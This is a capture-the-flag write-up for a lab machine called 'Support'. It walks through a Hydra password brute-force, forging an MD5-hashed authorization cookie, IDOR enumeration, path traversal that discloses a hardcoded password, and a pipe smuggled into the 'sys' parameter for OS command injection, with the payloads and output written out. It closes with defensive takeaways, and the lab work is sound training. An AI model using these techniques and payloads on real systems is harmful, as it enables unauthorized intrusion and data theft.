## Support - THM
Oct 8, 2026 · @Gh0ulH4x

---
## Machine Information
```Notes
A newly deployed internal Support Operations Platform. Handles user management,
internal APIs, and system-level operations. Security was not the primary focus
during development — several features rely on user-controlled input and weak
trust boundaries.

Goal: pentest the platform and escalate access to achieve RCE on the server.
```
- IP: `10.48.138.254`

---
## Enumeration

### Network Scanning
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 5f:a1:18:2d:77:6a:61:d1:10:bb:f5:60:c9:82:c4:41 (ECDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVO3vq8yaeAi5eMbzcs2E6hYGgWmP58OrO7G4I2PXV0
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Support Operations Panel
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
- Only two open ports of interest: `22/SSH` and `80/HTTP`.
- The `PHPSESSID` cookie missing the `httponly` flag is a minor finding on its own (XSS could steal it), but it hints the app is a fairly plain PHP stack — worth keeping in mind for later LFI/config-disclosure attempts.

### Port 80 — Login Page
- The login form at `/` references `help@support.thm` as a visible example e-mail address — a strong signal this is a valid, in-use account rather than a placeholder.

---
## Initial Access — Credential Brute-Force

### Hydra Attack
```bash
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt 10.48.138.254 \
  http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials" -V
```
```bash
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 05:42:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400)
[DATA] attacking http-post-form://10.48.138.254:80/:email=^USER^&password=^PASS^:F=Invalid credentials
[80][http-post-form] host: 10.48.138.254   login: help@support.thm   password: snoopy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 05:42:21
```

> **Note on the fail-string:** the first attempt used `F=incorrect`, which doesn't appear anywhere on the page — Hydra flagged *every* password as "valid" (a classic false-positive). Manually submitting a bad login and diffing the response body against a real failure found the actual string, `Invalid credentials`, which made the attack work correctly.

### Credentials Found
```
Username/E-Mail : help@support.thm
Password        : snoopy
```

---
## Privilege Escalation (Web Application Layer)

### Cookie Analysis
After logging in, the session carried a second cookie alongside `PHPSESSID`:
```
isITUser=68934a3e9455fa72420237eb05902327
```
- This looked like an MD5 hash controlling a boolean permission flag rather than an opaque session token.

```bash
$ haiti "$(cat hash.txt)"
MD5 [HC: 0] [JtR: raw-md5]
LM [HC: 3000] [JtR: lm]

$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
$ hashcat -m 0 hash.txt --show
68934a3e9455fa72420237eb05902327:false
```
- Cracking it revealed the plaintext `false` — i.e. the cookie is `md5("false")`, and the app is almost certainly checking `isITUser` against `md5("true")` server-side instead of validating anything meaningful about the user. This is a textbook **client-trusted authorization flag**: the server hands the client a value, trusts whatever comes back, and never re-validates it against the actual account.

### Forging Elevated Access
```bash
$ echo -n "true" | md5sum
b326b5062b2f0e69046810717534cb09
```
- Replacing the cookie with `isITUser=b326b5062b2f0e69046810717534cb09` granted access to the Admin Panel immediately — no further authentication required.

### IDOR on the Internal API
- With panel access, an internal API became reachable:
```
GET /api.php?... → GET /user/3
```
```json
{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```
- The `user/{id}` endpoint takes a raw, unauthenticated-to-ownership integer — a classic **IDOR**. Walking the ID space downward surfaced the real target:
```bash
GET /user/1
```
```json
HTTP/1.1 200 OK
...
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```
This confirms `specialadmin@support.thm` is the true administrator account — and crucially, `2FA` is `false`, so a straight password login is still viable if credentials can be recovered.

### LFI → Config Disclosure
- The `skin` parameter on the dashboard proved vulnerable to path traversal:
```
/dashboard.php?skin=../config
```
```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```
- A hardcoded **master password** readable straight out of a PHP include file via LFI — this is the kind of secret that's meant to be a backend fallback/override but ends up reachable by any user who can traverse the filesystem through an unsanitized template/skin parameter.

### Admin Login
The literal master password didn't work first try — the app appears to do some light normalization/sanitization on login input:
```
Tried: Support@110        → failed
Tried: support110          → success
```
```
Username : specialadmin@support.thm
Password : support110
```

**Flag (Admin Access):**
```
THM{I_AM_ADMIN999}
```

- Logging in as `specialadmin` revealed a new column in the panel: a **`sys`** field displaying the server's Date/Time.

---
## Privilege Escalation (OS Command Injection → RCE)

### Discovering the Injection Point
The `sys` field is populated by a backend request that runs a shell command and returns its output:
```bash
POST /dashboard.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=re881vlk9sp3g9e0uveg32tffv; isITUser=b326b5062b2f0e69046810717534cb09

sys=date%20%7C%20ls%20%2Dla%20/home
```
Decoded, the payload is:
```
date | ls -la /home
```
The endpoint appears to allow-list/expect only the `date` command — but it does **not** sanitize shell metacharacters like the pipe (`|`). URL-encoding the pipe (`%7C`) and spaces (`%20`) was enough to smuggle an arbitrary second command through unfiltered, giving full **OS command injection** and effectively unauthenticated-to-RCE access as whatever user the web service runs as.

```bash
total 16
drwxr-xr-x  4 root   root   4096 Jan 22  2026 .
drwxr-xr-x 22 root   root   4096 Oct  8 11:09 ..
drwxr-x---  2 qathm  qathm  4096 Jan 22  2026 qathm
drwxr-xr-x  4 ubuntu ubuntu 4096 Jan 21  2026 ubuntu
```

### Grabbing the User Flag
```
sys = date%20%7C%20ls%20%2Dla%20/home/ubuntu
```
```bash
total 36
drwxr-xr-x 4 ubuntu ubuntu 4096 Jan 21  2026 .
drwxr-xr-x 4 root   root   4096 Jan 22  2026 ..
-rw------- 1 ubuntu ubuntu  122 Oct 22  2024 .Xauthority
lrwxrwxrwx 1 ubuntu ubuntu    9 Oct 22  2024 .bash_history -> /dev/null
drwx------ 2 ubuntu ubuntu 4096 Oct 22  2024 .ssh
-rw-rw-r-- 1 ubuntu ubuntu   20 Jan 21  2026 user.txt
```
Since the command injection gives arbitrary read (and the `.ssh` directory is present), a full interactive shell is reachable by dropping an SSH key into `ubuntu`'s `authorized_keys` via the same injection point — but the flag itself can be pulled directly through the injection without ever needing a shell:
```
sys=date%20%7C%20cat%20/home/ubuntu/user.txt
```

**Flag (RCE / User):**
```
THM{GOT_THE_FLAG001}
```

---
## Full Attack Chain Summary

```
TCP/80 (Support Operations Panel)
    ↓
Login page leaks valid username (help@support.thm) in UI
    ↓
Hydra brute-force (rockyou.txt) → password "snoopy"
    ↓
Authenticated login → isITUser=md5("false") cookie observed
    ↓
Cookie cracked via hashcat → plaintext "false"
    ↓
Forge isITUser=md5("true") → client-trusted auth flag bypass → Admin Panel access
    ↓
IDOR on /user/{id} API → enumerate down to /user/1 → real admin = specialadmin@support.thm
    ↓
LFI via dashboard.php?skin=../config → hardcoded $MASTER_PASSWORD disclosed
    ↓
Password variation (support110) → login as specialadmin
    ↓
ADMIN FLAG
    ↓
New "sys" (Date/Time) field → backend shell-outs to `date`
    ↓
URL-encoded pipe (%7C) smuggled past command allow-list → OS command injection
    ↓
Arbitrary command execution as web service user
    ↓
USER / RCE FLAG
```

---
## Key Takeaways

1. **Never trust a client-supplied authorization flag.** `isITUser` was a hashed boolean sitting in a cookie the client controls — once the hashing scheme was guessed (plain `md5(bool)`), privilege escalation was just forging a new cookie value, no exploit required.
2. **Sequential/numeric IDs in an API are an IDOR waiting to happen.** `/user/{id}` with no ownership check let a low-ID walk reveal the real administrator account outright.
3. **LFI is rarely "just a file read."** Reaching an include/config file through a `skin=`-style parameter handed over a hardcoded master password — app secrets committed to source are only as safe as the first path-traversal bug.
4. **Command allow-lists must consider shell metacharacters, not just the first token.** Permitting `date` while failing to strip `|`, `;`, `` ` ``, or `&&` (even URL-encoded) turns a narrow "run one safe command" feature into full RCE.
5. **Defense in depth would have stopped this chain at multiple points** — any one of (proper session/authz design, parameterized API access control, path sanitization, or shell-safe command execution) would have blocked escalation even after the initial brute-force succeeded.
